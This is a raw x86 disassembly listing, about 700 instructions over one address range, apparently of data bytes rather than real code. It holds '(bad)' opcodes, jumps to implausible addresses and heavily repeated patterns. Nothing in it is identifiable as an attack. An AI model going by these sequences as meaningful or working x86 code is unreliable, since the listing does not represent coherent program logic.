  40e1cf:	add    BYTE PTR ds:0x62404341,al
  40e1d5:	pop    eax
  40e1d6:	add    BYTE PTR [ebx+0x40],al
  40e1d9:	bound  ecx,QWORD PTR [edi]
  40e1db:	inc    eax
  40e1dc:	inc    edx
  40e1dd:	and    dh,ch
  40e1df:	mov    al,0x5
  40e1e1:	adc    DWORD PTR [ecx+ebx*4],eax
  40e1e4:	and    eax,0x860de37a
  40e1e9:	pushf  
  40e1ea:	lock cmp BYTE PTR [edx+edx*2-0x1],0x11
  40e1f0:	and    al,0xed
  40e1f2:	rol    BYTE PTR [ecx-0x39],cl
  40e1f5:	jmp    0x66375423
  40e1fa:	add    BYTE PTR [eax],al
  40e1fc:	inc    eax
  40e1fd:	inc    eax
  40e1fe:	cmovno eax,DWORD PTR ds:0x40056243
  40e205:	int3   
  40e206:	add    ah,cl
  40e208:	inc    eax
  40e209:	inc    eax
  40e20a:	bound  eax,QWORD PTR [ecx+0x0]
  40e20d:	add    BYTE PTR [edi],cl
  40e20f:	inc    ebx
  40e210:	inc    eax
  40e211:	inc    eax
  40e212:	add    BYTE PTR [ecx+0x43],al
  40e215:	add    eax,0x40256240
  40e21a:	bound  eax,QWORD PTR [eax]
  40e21c:	sbb    DWORD PTR [edi-0x52],eax
  40e21f:	loope  0x40e1bd
  40e221:	bound  eax,QWORD PTR ds:0x4a247b9b
  40e227:	sub    DWORD PTR ds:0xdddc8650,esp
  40e22d:	fmul   QWORD PTR [edx]
  40e22f:	add    BYTE PTR [edx+0x33],0x29
  40e233:	push   edi
  40e234:	mov    edi,0xa0245240
  40e239:	inc    ecx
  40e23a:	cmc    
  40e23b:	je     0x40e1fc
  40e23d:	xor    DWORD PTR [eax+0x5660729],ebx
  40e243:	imul   edi,DWORD PTR [edi-0x36bcbc94],0xcc000554
  40e24d:	inc    eax
  40e24e:	inc    ecx
  40e24f:	inc    eax
  40e250:	inc    ebx
  40e251:	bound  esp,QWORD PTR ds:0x41400043
  40e257:	add    BYTE PTR [eax],al
  40e259:	add    eax,0x43624062
  40e25e:	inc    ecx
  40e25f:	inc    eax
  40e260:	inc    eax
  40e261:	inc    eax
  40e262:	add    eax,0x40624340
  40e267:	add    eax,0x40664140
  40e26c:	xchg   BYTE PTR [ebx],al
  40e26e:	mov    edi,0x22a30501
  40e273:	jp     0x40e2a7
  40e275:	mov    WORD PTR [ecx+0xd],es
  40e278:	gs sbb eax,0x57f4c925
  40e27e:	inc    edi
  40e27f:	jmp    0x16714a54
  40e284:	add    eax,0x43543c5e
  40e289:	add    BYTE PTR ds:0x41107840,al
  40e28f:	bound  eax,QWORD PTR [eax+0x40]
  40e292:	sldt   WORD PTR [eax-0x34]
  40e296:	js     0x40e2fa
  40e298:	add    eax,0x40664143
  40e29d:	inc    ebx
  40e29e:	add    BYTE PTR [ecx+0x5],al
  40e2a1:	js     0x40e2e3
  40e2a3:	bound  eax,QWORD PTR [eax+0x0]
  40e2a6:	inc    eax
  40e2a7:	out    0x65,eax
  40e2a9:	and    DWORD PTR [ecx-0x7a],edx
  40e2ac:	enter  0xba67,0xaa
  40e2b0:	push   esp
  40e2b1:	mov    ch,0x39
  40e2b3:	adc    al,0x85
  40e2b5:	inc    eax
  40e2b6:	pusha  
  40e2b7:	or     ebp,DWORD PTR [ebx]
  40e2b9:	dec    ebp
  40e2ba:	mov    eax,0x285cf9f3
  40e2bf:	iret   
  40e2c0:	jbe    0x40e2a3
  40e2c2:	sbb    eax,0x416fa805
  40e2c7:	pop    ss
  40e2c8:	and    al,0xc2
  40e2ca:	cmc    
  40e2cb:	xchg   BYTE PTR [eax],al
  40e2cd:	pop    ecx
  40e2ce:	add    eax,0xae3292e
  40e2d3:	pusha  
  40e2d4:	pop    ss
  40e2d5:	mov    eax,0xff1bc950
  40e2da:	cmp    al,0xf2
  40e2dc:	bound  esp,QWORD PTR [edx+eiz*2-0x17]
  40e2e0:	sub    esp,DWORD PTR [ecx+0x40404341]
  40e2e6:	add    eax,0x434162
  40e2eb:	inc    eax
  40e2ec:	add    BYTE PTR [edx+0x5],ah
  40e2ef:	inc    eax
  40e2f0:	adc    BYTE PTR [edx+0x40],ah
  40e2f3:	inc    ebx
  40e2f4:	inc    ecx
  40e2f5:	add    eax,0x4340
  40e2fa:	add    eax,0x404162
  40e2ff:	add    BYTE PTR [eax+0x43],al
  40e302:	inc    eax
  40e303:	add    eax,0x1873056b
  40e308:	inc    eax
  40e309:	dec    ecx
  40e30a:	dec    esp
  40e30b:	and    eax,0x65d486dc
  40e310:	xor    BYTE PTR [ecx],dl
  40e312:	gs popa 
  40e314:	bound  edi,QWORD PTR [ebx+0x55]
  40e317:	xor    eax,0x2912d16c
  40e31c:	pop    ds
  40e31d:	icebp  
  40e31e:	inc    ecx
  40e31f:	and    al,0x1e
  40e321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e322:	jmp    0x40e2d7
  40e324:	add    BYTE PTR ds:0x64344c9,0x33
  40e32b:	and    ebp,DWORD PTR [edi-0x7a]
  40e32e:	pop    eax
  40e32f:	and    cl,dl
  40e331:	es gs in eax,0x98
  40e335:	jno    0x40e344
  40e337:	xlat   BYTE PTR gs:[ebx]
  40e339:	xchg   esp,eax
  40e33a:	scas   eax,DWORD PTR es:[edi]
  40e33b:	xchg   BYTE PTR [eax+0x0],al
  40e33e:	add    BYTE PTR [ecx+0x43],al
  40e341:	add    eax,0x41784062
  40e346:	inc    eax
  40e347:	inc    eax
  40e348:	add    BYTE PTR [edi],cl
  40e34a:	bound  eax,QWORD PTR [ebx+0x0]
  40e34d:	add    eax,0x25006240
  40e352:	inc    eax
  40e353:	add    eax,0x40254143
  40e358:	add    eax,0x19620000
  40e35d:	lock inc ecx
  40e35f:	push   ss
  40e360:	xchg   esp,eax
  40e361:	sub    al,0xa0
  40e363:	out    0x34,eax
  40e365:	add    eax,0xddab3149
  40e36a:	es shr ecx,0x86
  40e36e:	mov    WORD PTR [edx+0x42],fs
  40e371:	ss sub dh,cl
  40e374:	call   0x4062:0x4103c16e
  40e37b:	mov    edi,0xc0a8ef66
  40e380:	inc    ebx
  40e381:	leave  
  40e382:	and    edx,ecx
  40e384:	mov    ds:0x3066e105,al
  40e389:	push   ecx
  40e38a:	push   eax
  40e38b:	jns    0x40e335
  40e38d:	xchg   BYTE PTR [esi],dh
  40e38f:	push   esp
  40e390:	aam    0xb1
  40e392:	loopne 0x40e354
  40e394:	inc    ebx
  40e395:	add    BYTE PTR [eax],al
  40e397:	add    BYTE PTR [ecx+0x40],al
  40e39a:	bound  esp,QWORD PTR [esi+0x0]
  40e39d:	inc    eax
  40e39e:	add    eax,0x5400000
  40e3a3:	inc    ecx
  40e3a4:	inc    eax
  40e3a5:	inc    eax
  40e3a6:	bound  esp,QWORD PTR ds:0x25050043
  40e3ac:	inc    ecx
  40e3ad:	inc    ebx
  40e3ae:	inc    eax
  40e3af:	test   BYTE PTR [eax+0x0],al
  40e3b2:	bound  ebx,QWORD PTR [eax+0x62]
  40e3b5:	inc    ecx
  40e3b6:	inc    eax
  40e3b7:	inc    ecx
  40e3b8:	jbe    0x40e381
  40e3ba:	xor    eax,0xe9214c40
  40e3bf:	sub    ch,dh
  40e3c1:	in     al,dx
  40e3c2:	jns    0x40e3f5
  40e3c4:	mov    esi,0x541c051
  40e3c9:	push   esp
  40e3ca:	fisubr WORD PTR [ebx+ebp*4-0x5e]
  40e3ce:	(bad)  
  40e3cf:	cmp    eax,0x3b534086
  40e3d4:	mov    esi,0x60a4c42c
  40e3d9:	adc    BYTE PTR [ecx+0x43],dl
  40e3dc:	jno    0x40e3a8
  40e3de:	xor    eax,0x6210ed06
  40e3e3:	inc    eax
  40e3e4:	inc    ecx
  40e3e5:	and    eax,0x40000500
  40e3ea:	inc    ebx
  40e3eb:	add    eax,0x40624041
  40e3f0:	inc    ebx
  40e3f1:	add    eax,0x43402541
  40e3f6:	bound  eax,QWORD PTR [eax+0x43]
  40e3f9:	int3   
  40e3fa:	inc    eax
  40e3fb:	bound  eax,QWORD PTR [eax]
  40e3fd:	inc    ecx
  40e3fe:	inc    eax
  40e3ff:	inc    eax
  40e400:	add    eax,0xd1f06b05
  40e405:	fld    QWORD PTR [ecx-0x3c]
  40e408:	cwde   
  40e409:	add    eax,0x3ce5674a
  40e40e:	mov    eax,ds:0xa8864f3f
  40e413:	inc    esi
  40e414:	sub    BYTE PTR [eax],0x63
  40e417:	vunpcklps ymm2,ymm6,YMMWORD PTR [ecx]
  40e41b:	sub    cl,bl
  40e41d:	shl    BYTE PTR [ecx],cl
  40e41f:	xor    eax,ecx
  40e421:	bound  eax,QWORD PTR [eax+0x25]
  40e424:	add    BYTE PTR [esi+0x40],ah
  40e427:	add    eax,0x40404143
  40e42c:	inc    ebx
  40e42d:	add    BYTE PTR [eax],al
  40e42f:	add    BYTE PTR [edx-0x34],ah
  40e432:	inc    eax
  40e433:	add    eax,0x40004041
  40e438:	inc    ecx
  40e439:	int3   
  40e43a:	add    BYTE PTR [ebx-0x7c],al
  40e43d:	add    eax,0x5406240
  40e442:	(bad)  
  40e443:	in     al,dx
  40e444:	mov    esp,0x4d5f5b06
  40e449:	aas    
  40e44a:	dec    esp
  40e44b:	add    eax,0xca41a841
  40e450:	popa   
  40e451:	arpl   WORD PTR [esi+eax*4-0x32],sp
  40e455:	adc    BYTE PTR [ebx-0x30],al
  40e458:	mov    WORD PTR [edx-0x57],es
  40e45b:	push   cs
  40e45c:	in     al,0xbc
  40e45e:	xor    bl,ch
  40e460:	jecxz  0x40e483
  40e462:	mov    esp,0xd04141eb
  40e467:	jmp    0x5b4a3b6
  40e46c:	dec    eax
  40e46d:	int    0x40
  40e46f:	scas   eax,DWORD PTR es:[edi]
  40e470:	inc    eax
  40e471:	bound  ebx,QWORD PTR [eax+0x41]
  40e474:	add    eax,0x40404340
  40e479:	inc    ebx
  40e47a:	inc    eax
  40e47b:	test   BYTE PTR [eax],al
  40e47d:	add    eax,0x40624041
  40e482:	inc    eax
  40e483:	add    BYTE PTR [edx+0x5],ah
  40e486:	inc    ebx
  40e487:	add    BYTE PTR [eax+0x78],al
  40e48a:	inc    ecx
  40e48b:	add    BYTE PTR [eax+0x41],bl
  40e48e:	bound  esp,QWORD PTR [edx+0x57]
  40e491:	ret    0x6986
  40e494:	mov    al,0x31
  40e496:	dec    esp
  40e497:	daa    
  40e498:	cmp    DWORD PTR [eax+eiz*2+0x5f],edx
  40e49c:	mov    WORD PTR [ecx+eiz*2+0x45],gs
  40e4a0:	dec    eax
  40e4a1:	or     eax,0xd851a8ea
  40e4a6:	aam    0xa0
  40e4a8:	in     eax,dx
  40e4a9:	push   0xcc008440
  40e4ae:	bound  eax,QWORD PTR ds:0xcc840f41
  40e4b4:	inc    ebx
  40e4b5:	add    BYTE PTR [eax+0x0],al
  40e4b8:	inc    eax
  40e4b9:	inc    eax
  40e4ba:	inc    eax
  40e4bb:	int3   
  40e4bc:	add    BYTE PTR ds:0x62404341,al
  40e4c2:	pop    eax
  40e4c3:	add    BYTE PTR [ebx+0x40],al
  40e4c6:	bound  ecx,QWORD PTR [edi]
  40e4c8:	inc    eax
  40e4c9:	add    eax,0xd84af111
  40e4ce:	xor    BYTE PTR [edi+0x62],dl
  40e4d1:	xchg   BYTE PTR [ebp+ebp*2+0x33ba4bd9],bh
  40e4d8:	xor    ecx,DWORD PTR [di]
  40e4db:	inc    ebx
  40e4dc:	(bad)  
  40e4dd:	push   ecx
  40e4de:	into   
  40e4df:	push   edi
  40e4e0:	cmp    al,0xe9
  40e4e2:	inc    edx
  40e4e3:	sub    dh,ah
  40e4e5:	inc    edx
  40e4e6:	jecxz  0x40e527
  40e4e8:	dec    esp
  40e4e9:	add    eax,0xe5ae4165
  40e4ee:	push   ebx
  40e4ef:	dec    edi
  40e4f0:	pushf  
  40e4f1:	xchg   BYTE PTR [eax-0x5c85a8d6],cl
  40e4f7:	mov    eax,ds:0x41623754
  40e4fc:	inc    ecx
  40e4fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4fe:	push   ebp
  40e4ff:	inc    eax
  40e500:	dec    edi
  40e501:	call   0x3083f87a
  40e506:	add    BYTE PTR [eax],al
  40e508:	inc    eax
  40e509:	inc    eax
  40e50a:	cmovno eax,DWORD PTR ds:0x40056243
  40e511:	int3   
  40e512:	add    ah,cl
  40e514:	inc    eax
  40e515:	inc    eax
  40e516:	bound  eax,QWORD PTR [ecx+0x0]
  40e519:	add    BYTE PTR [edi],cl
  40e51b:	inc    ebx
  40e51c:	inc    eax
  40e51d:	inc    eax
  40e51e:	add    BYTE PTR [ecx+0x43],al
  40e521:	add    eax,0x40256240
  40e526:	bound  eax,QWORD PTR [eax]
  40e528:	loope  0x40e50c
  40e52a:	fld    QWORD PTR ds:0x86302428
  40e530:	and    eax,0x5686fd09
  40e535:	imul   ecx,esp,0xc64a189
  40e53b:	das    
  40e53c:	inc    ebx
  40e53d:	mov    BYTE PTR [eax-0x3c],al
  40e540:	inc    esi
  40e541:	mov    al,ds:0x3823e764
  40e546:	xor    DWORD PTR ds:0x541bda3,ebp
  40e54c:	mov    esi,0x22c06c28
  40e551:	jl     0xf589e7dd
  40e557:	jns    0x40e5be
  40e559:	dec    esi
  40e55a:	mov    al,BYTE PTR ds:0x4140cc00
  40e560:	inc    eax
  40e561:	inc    ebx
  40e562:	bound  esp,QWORD PTR ds:0x41400043
  40e568:	add    BYTE PTR [eax],al
  40e56a:	add    eax,0x43624062
  40e56f:	inc    ecx
  40e570:	inc    eax
  40e571:	inc    eax
  40e572:	inc    eax
  40e573:	add    eax,0x40624340
  40e578:	add    eax,0x40664140
  40e57d:	and    al,0x4
  40e57f:	and    BYTE PTR [eax+0x75e20273],ch
  40e585:	out    0xf7,al
  40e587:	cmp    DWORD PTR [edx],edx
  40e589:	add    eax,0x5a957a7
  40e58e:	dec    edi
  40e58f:	test   al,0x76
  40e591:	mov    edi,0x86623f26
  40e596:	mov    esp,0xa0f1f712
  40e59b:	inc    ebx
  40e59c:	add    BYTE PTR ds:0x41107840,al
  40e5a2:	bound  eax,QWORD PTR [eax+0x40]
  40e5a5:	sldt   WORD PTR [eax-0x34]
  40e5a9:	js     0x40e60d
  40e5ab:	add    eax,0x40664143
  40e5b0:	inc    ebx
  40e5b1:	add    BYTE PTR [ecx+0x5],al
  40e5b4:	js     0x40e5f6
  40e5b6:	bound  eax,QWORD PTR [eax+0x0]
  40e5b9:	inc    eax
  40e5ba:	jae    0x40e60d
  40e5bc:	cs adc eax,0xbf4262a4
  40e5c2:	push   edi
  40e5c3:	loopne 0x40e5aa
  40e5c5:	retf   
  40e5c6:	inc    ecx
  40e5c7:	push   es
  40e5c8:	jp     0x40e5f7
  40e5ca:	cmp    DWORD PTR [eax*1+0x53163845],eax
  40e5d1:	jle    0x40e62a
  40e5d3:	xchg   esi,eax
  40e5d4:	xchg   BYTE PTR [eax],bl
  40e5d6:	call   0x4081291c
  40e5db:	add    eax,0x434162
  40e5e0:	inc    eax
  40e5e1:	add    BYTE PTR [edx+0x5],ah
  40e5e4:	inc    eax
  40e5e5:	adc    BYTE PTR [edx+0x40],ah
  40e5e8:	inc    ebx
  40e5e9:	inc    ecx
  40e5ea:	add    eax,0x4340
  40e5ef:	add    eax,0x404162
  40e5f4:	add    BYTE PTR [eax+0x43],al
  40e5f7:	inc    eax
  40e5f8:	add    eax,0x3fab113e
  40e5fd:	push   edx
  40e5fe:	sub    DWORD PTR [eax],ebx
  40e600:	adc    eax,DWORD PTR [ebx+0x63]
  40e603:	push   ebx
  40e604:	dec    eax
  40e605:	xor    ah,ah
  40e607:	arpl   WORD PTR [eax-0x125f26cd],ax
  40e60d:	rol    DWORD PTR ds:0x56c8674b,1
  40e613:	xor    eax,0x8d863456
  40e618:	rol    BYTE PTR [eax+0x5e],1
  40e61b:	and    ebx,esi
  40e61d:	pop    eax
  40e61e:	pop    ss
  40e61f:	inc    esp
  40e620:	arpl   WORD PTR [ecx],si
  40e622:	jne    0x40e647
  40e624:	das    
  40e625:	push   ebx
  40e626:	jecxz  0x40e5fa
  40e628:	add    eax,0x56015c6c
  40e62d:	rol    DWORD PTR ds:0x7292876f,1
  40e633:	inc    eax
  40e634:	add    BYTE PTR [eax],al
  40e636:	inc    ecx
  40e637:	inc    ebx
  40e638:	add    eax,0x41784062
  40e63d:	inc    eax
  40e63e:	inc    eax
  40e63f:	add    BYTE PTR [edi],cl
  40e641:	bound  eax,QWORD PTR [ebx+0x0]
  40e644:	add    eax,0x25006240
  40e649:	inc    eax
  40e64a:	add    eax,0x40254143
  40e64f:	add    eax,0xa1620000
  40e654:	jmp    DWORD PTR ds:0x4d943486
  40e65a:	fidivr WORD PTR [esi-0x1c]
  40e65d:	test   al,0x60
  40e65f:	sbb    al,0xd
  40e661:	cmc    
  40e662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e663:	and    eax,0xb8e24220
  40e668:	leave  
  40e669:	pop    eax
  40e66a:	xchg   esp,eax
  40e66b:	pop    edx
  40e66c:	add    eax,0xacc3052a
  40e671:	push   ds
  40e672:	mov    al,ds:0x86127363
  40e677:	inc    edx
  40e678:	or     eax,0x602fbe7a
  40e67d:	inc    ebx
  40e67e:	add    BYTE PTR [eax],al
  40e680:	add    BYTE PTR [ecx+0x40],al
  40e683:	bound  esp,QWORD PTR [esi+0x0]
  40e686:	inc    eax
  40e687:	add    eax,0x5400000
  40e68c:	inc    ecx
  40e68d:	inc    eax
  40e68e:	inc    eax
  40e68f:	bound  esp,QWORD PTR ds:0x25050043
  40e695:	inc    ecx
  40e696:	inc    ebx
  40e697:	inc    eax
  40e698:	test   BYTE PTR [eax+0x0],al
  40e69b:	bound  ebx,QWORD PTR [eax+0x62]
  40e69e:	inc    ecx
  40e69f:	inc    eax
  40e6a0:	mov    esp,0x4344ef7b
  40e6a5:	cli    
  40e6a6:	ja     0x40e71a
  40e6a8:	inc    ebx
  40e6a9:	loope  0x40e6d7
  40e6ab:	jae    0x40e6e0
  40e6ad:	loopne 0x40e696
  40e6af:	inc    ecx
  40e6b0:	xor    BYTE PTR ds:0x71c4d862,al
  40e6b6:	out    dx,al
  40e6b7:	mov    al,ds:0x984c8628
  40e6bc:	shl    DWORD PTR [ebx+0x702f0fa5],0xef
  40e6c3:	add    eax,0x4082bf44
  40e6c8:	call   0x5ac814ad
  40e6cd:	and    ah,BYTE PTR [ebx+0x62056294]
  40e6d3:	retf   0x656a
  40e6d6:	inc    ecx
  40e6d7:	adc    al,0x6c
  40e6d9:	xchg   ch,bh
  40e6db:	(bad)  
  40e6dc:	mov    cl,0x10
  40e6de:	bound  eax,QWORD PTR [eax+0x41]
  40e6e1:	and    eax,0x40000500
  40e6e6:	inc    ebx
  40e6e7:	add    eax,0x40624041
  40e6ec:	inc    ebx
  40e6ed:	add    eax,0x43402541
  40e6f2:	bound  eax,QWORD PTR [eax+0x43]
  40e6f5:	int3   
  40e6f6:	inc    eax
  40e6f7:	bound  eax,QWORD PTR [eax]
  40e6f9:	inc    ecx
  40e6fa:	inc    eax
  40e6fb:	inc    eax
  40e6fc:	add    eax,0x4d214a05
  40e701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e702:	outs   dx,BYTE PTR ds:[esi]
  40e703:	dec    eax
  40e704:	jae    0x40e6b5
  40e706:	test   al,0x70
  40e708:	mov    ds:0xf862df64,al
  40e70d:	inc    ebx
  40e70e:	add    BYTE PTR [edx],ah
  40e710:	push   ebp
  40e711:	inc    ebx
  40e712:	add    eax,0xb3d28c42
  40e717:	es mov edi,0x5f8862a
  40e71d:	adc    dl,BYTE PTR [esi+0x7977720d]
  40e723:	inc    eax
  40e724:	xchg   DWORD PTR [edx+0x5855659c],edx
  40e72a:	ficom  WORD PTR [edx]
  40e72c:	dec    edi
  40e72d:	bound  eax,QWORD PTR [eax+0x25]
  40e730:	add    BYTE PTR [esi+0x40],ah
  40e733:	add    eax,0x40404143
  40e738:	inc    ebx
  40e739:	add    BYTE PTR [eax],al
  40e73b:	add    BYTE PTR [edx-0x34],ah
  40e73e:	inc    eax
  40e73f:	add    eax,0x40004041
  40e744:	inc    ecx
  40e745:	int3   
  40e746:	add    BYTE PTR [ebx-0x7c],al
  40e749:	add    eax,0x5406240
  40e74e:	bound  ebx,QWORD PTR [edx-0x6c]
  40e751:	adc    dh,BYTE PTR [edi-0x6496fadd]
  40e757:	popa   
  40e758:	and    ebp,DWORD PTR [ebx+0x2286e652]
  40e75e:	push   edx
  40e75f:	inc    ecx
  40e760:	sar    BYTE PTR [ebx+0x42602cb1],1
  40e766:	inc    eax
  40e767:	bound  ebx,QWORD PTR [eax+0x41]
  40e76a:	add    eax,0x40404340
  40e76f:	inc    ebx
  40e770:	inc    eax
  40e771:	test   BYTE PTR [eax],al
  40e773:	add    eax,0x40624041
  40e778:	inc    eax
  40e779:	add    BYTE PTR [edx+0x5],ah
  40e77c:	inc    ebx
  40e77d:	add    BYTE PTR [eax+0x78],al
  40e780:	inc    ecx
  40e781:	add    BYTE PTR [eax+0x41],bl
  40e784:	bound  esp,QWORD PTR [edi+0x36]
  40e787:	dec    edi
  40e788:	jo     0x40e7da
  40e78a:	arpl   bp,bx
  40e78c:	shr    esp,1
  40e78e:	xor    al,0xdd
  40e790:	jecxz  0x40e7f4
  40e792:	and    eax,0xc0653605
  40e797:	xor    al,0x48
  40e799:	outs   dx,DWORD PTR ds:[esi]
  40e79a:	test   al,0x86
  40e79c:	dec    esp
  40e79d:	xchg   edx,eax
  40e79e:	shr    DWORD PTR [edx+0x5412e62],0x62
  40e7a5:	jae    0x40e7e7
  40e7a7:	stos   DWORD PTR es:[edi],eax
  40e7a8:	cmp    BYTE PTR [edi],cl
  40e7aa:	sub    bl,ah
  40e7ac:	inc    eax
  40e7ad:	leave  
  40e7ae:	es nop
  40e7b0:	inc    eax
  40e7b1:	mov    ds:0x5300541,al
  40e7b6:	imul   ebp,DWORD PTR [edi-0x7956dedb],0x69
  40e7bd:	sub    BYTE PTR [eax-0x7c],al
  40e7c0:	add    ah,cl
  40e7c2:	bound  eax,QWORD PTR ds:0xcc840f41
  40e7c8:	inc    ebx
  40e7c9:	add    BYTE PTR [eax+0x0],al
  40e7cc:	inc    eax
  40e7cd:	inc    eax
  40e7ce:	inc    eax
  40e7cf:	int3   
  40e7d0:	add    BYTE PTR ds:0x62404341,al
  40e7d6:	pop    eax
  40e7d7:	add    BYTE PTR [ebx+0x40],al
  40e7da:	bound  ecx,QWORD PTR [edi]
  40e7dc:	inc    eax
  40e7dd:	dec    esp
  40e7de:	lock push edx
  40e7e0:	adc    edi,DWORD PTR [eax]
  40e7e2:	or     DWORD PTR [edi],esi
  40e7e4:	cld    
  40e7e5:	inc    ebx
  40e7e6:	mov    ah,BYTE PTR [ebx]
  40e7e8:	popa   
  40e7e9:	jno    0x40e7c6
  40e7eb:	inc    ebx
  40e7ec:	add    ch,0x5f
  40e7ef:	and    al,0x47
  40e7f1:	and    al,0x5
  40e7f3:	shr    DWORD PTR [edx+0x2b],1
  40e7f6:	mov    eax,0x862db9e9
  40e7fb:	push   esp
  40e7fc:	cli    
  40e7fd:	xor    al,0x8a
  40e7ff:	push   esp
  40e800:	jbe    0x40e7d6
  40e802:	adc    ebp,DWORD PTR [eax]
  40e804:	sub    DWORD PTR [bp+0x21],0xffffffe2
  40e809:	inc    ebp
  40e80a:	fisubr DWORD PTR [edx+0x48]
  40e80d:	adc    al,BYTE PTR gs:[edi+0x5905c02b]
  40e814:	mov    ah,0x28
  40e816:	sti    
  40e817:	dec    ebx
  40e818:	inc    eax
  40e819:	add    BYTE PTR [bx+si],al
  40e81c:	inc    eax
  40e81d:	inc    eax
  40e81e:	cmovno eax,DWORD PTR ds:0x40056243
  40e825:	int3   
  40e826:	add    ah,cl
  40e828:	inc    eax
  40e829:	inc    eax
  40e82a:	bound  eax,QWORD PTR [ecx+0x0]
  40e82d:	add    BYTE PTR [edi],cl
  40e82f:	inc    ebx
  40e830:	inc    eax
  40e831:	inc    eax
  40e832:	add    BYTE PTR [ecx+0x43],al
  40e835:	add    eax,0x40256240
  40e83a:	bound  eax,QWORD PTR [eax]
  40e83c:	xchg   cl,bl
  40e83e:	addr16 cmp al,0xad
  40e841:	mov    eax,ds:0x700d1e2e
  40e846:	ss inc ebx
  40e848:	jmp    0xd9ece090
  40e84d:	stos   DWORD PTR es:[edi],eax
  40e84e:	cmp    al,0x40
  40e850:	dec    ebx
  40e851:	loope  0x40e858
  40e853:	mov    ah,0x5
  40e855:	xchg   edx,eax
  40e856:	bound  esp,QWORD PTR [esp+edx*4]
  40e859:	pop    es
  40e85a:	mov    eax,ds:0xc30f8605
  40e85f:	ins    BYTE PTR es:[edi],dx
  40e860:	and    BYTE PTR [ebp+0x6f60cb49],ah
  40e866:	pop    es
  40e867:	pop    bx
  40e869:	push   ebp
  40e86a:	and    BYTE PTR [ebp+0x5],al
  40e86d:	add    ah,cl
  40e86f:	inc    eax
  40e870:	inc    ecx
  40e871:	inc    eax
  40e872:	inc    ebx
  40e873:	bound  esp,QWORD PTR ds:0x41400043
  40e879:	add    BYTE PTR [eax],al
  40e87b:	add    eax,0x43624062
  40e880:	inc    ecx
  40e881:	inc    eax
  40e882:	inc    eax
  40e883:	inc    eax
  40e884:	add    eax,0x40624340
  40e889:	add    eax,0x40664140
  40e88e:	fsub   DWORD PTR [ebx+0x3d]
  40e891:	inc    ebx
  40e892:	mov    BYTE PTR [edx+0x1f],ah
  40e895:	inc    ebx
  40e896:	add    eax,0xe3c56343
  40e89b:	cmp    DWORD PTR [ebp+0x75],eax
  40e89e:	xchg   al,cl
  40e8a0:	ja     0x40e8b3
  40e8a2:	daa    
  40e8a3:	push   ecx
  40e8a4:	mov    ds:0xf4d47bfc,al
  40e8a9:	fld    TBYTE PTR [ebx-0x1f]
  40e8ac:	xor    al,0x60
  40e8ae:	xlat   BYTE PTR ds:[ebx]
  40e8af:	ins    DWORD PTR es:[edi],dx
  40e8b0:	pop    ebx
  40e8b1:	lods   eax,DWORD PTR ds:[esi]
  40e8b2:	push   ds
  40e8b3:	imul   edx,DWORD PTR [esp+edi*1+0x5],0xffffffb1
  40e8b8:	fsubr  QWORD PTR [ebx+0x73]
  40e8bb:	gs inc ebx
  40e8bd:	add    BYTE PTR ds:0x41107840,al
  40e8c3:	bound  eax,QWORD PTR [eax+0x40]
  40e8c6:	sldt   WORD PTR [eax-0x34]
  40e8ca:	js     0x40e92e
  40e8cc:	add    eax,0x40664143
  40e8d1:	inc    ebx
  40e8d2:	add    BYTE PTR [ecx+0x5],al
  40e8d5:	js     0x40e917
  40e8d7:	bound  eax,QWORD PTR [eax+0x0]
  40e8da:	inc    eax
  40e8db:	and    ah,BYTE PTR [edx-0x7a]
  40e8de:	arpl   WORD PTR [eax+0x28],bp
  40e8e1:	cwde   
  40e8e2:	jle    0x40e916
  40e8e4:	xor    BYTE PTR ds:0x76387a7e,ah
  40e8ea:	and    DWORD PTR [esi+0x3c],eax
  40e8ed:	(bad)  
  40e8ee:	mov    eax,0xb78f4368
  40e8f3:	pusha  
  40e8f4:	addr16 add eax,0x3406262
  40e8fa:	push   edx
  40e8fb:	xchg   ebp,eax
  40e8fc:	push   edi
  40e8fd:	xchg   BYTE PTR [edi-0x33],dl
  40e900:	and    al,0xf2
  40e902:	mov    eax,ds:0x592cdc34
  40e907:	fsubr  QWORD PTR [edx+eax*4+0x68]
  40e90b:	add    BYTE PTR [esi-0x2b],al
  40e90e:	int    0x41
  40e910:	inc    ebx
  40e911:	inc    eax
  40e912:	inc    eax
  40e913:	add    eax,0x434162
  40e918:	inc    eax
  40e919:	add    BYTE PTR [edx+0x5],ah
  40e91c:	inc    eax
  40e91d:	adc    BYTE PTR [edx+0x40],ah
  40e920:	inc    ebx
  40e921:	inc    ecx
  40e922:	add    eax,0x4340
  40e927:	add    eax,0x404162
  40e92c:	add    BYTE PTR [eax+0x43],al
  40e92f:	inc    eax
  40e930:	add    eax,0x25000049
  40e935:	mov    eax,ds:0x9992058c
  40e93a:	inc    ebx
  40e93b:	mov    ?,WORD PTR ds:0x15866743
  40e941:	test   al,0xc5
  40e943:	cli    
  40e944:	fs pusha 
  40e946:	mov    cl,0x22
  40e948:	lods   eax,DWORD PTR ds:[esi]
  40e949:	imul   eax,DWORD PTR [ebx-0x71],0xd4d80e2f
  40e950:	arpl   WORD PTR [edi+0x4042f5a5],di
  40e956:	fs add eax,0x1e29627e
  40e95c:	popa   
  40e95d:	or     DWORD PTR [ecx-0x7a],eax
  40e960:	inc    eax
  40e961:	add    BYTE PTR [eax],al
  40e963:	inc    ecx
  40e964:	inc    ebx
  40e965:	add    eax,0x41784062
  40e96a:	inc    eax
  40e96b:	inc    eax
  40e96c:	add    BYTE PTR [edi],cl
  40e96e:	bound  eax,QWORD PTR [ebx+0x0]
  40e971:	add    eax,0x25006240
  40e976:	inc    eax
  40e977:	add    eax,0x40254143
  40e97c:	add    eax,0x30620000
  40e981:	push   eax
  40e982:	mov    ch,0x45
  40e984:	dec    ecx
  40e985:	push   ebp
  40e986:	mov    WORD PTR [ecx],gs
  40e988:	(bad)  
  40e989:	clc    
  40e98a:	sub    BYTE PTR [edx-0x2cec9f5f],dl
  40e990:	cmp    DWORD PTR ds:0xd556434,esp
  40e996:	pop    ecx
  40e997:	add    eax,0xf64309ef
  40e99c:	loope  0x40e9c0
  40e99e:	in     eax,0x86
  40e9a0:	test   al,0xd9
  40e9a2:	inc    eax
  40e9a3:	addr16 dec ebp
  40e9a5:	inc    eax
  40e9a6:	dec    eax
  40e9a7:	xor    al,0x11
  40e9a9:	dec    esp
  40e9aa:	and    al,0x89
  40e9ac:	loop   0x40e9cd
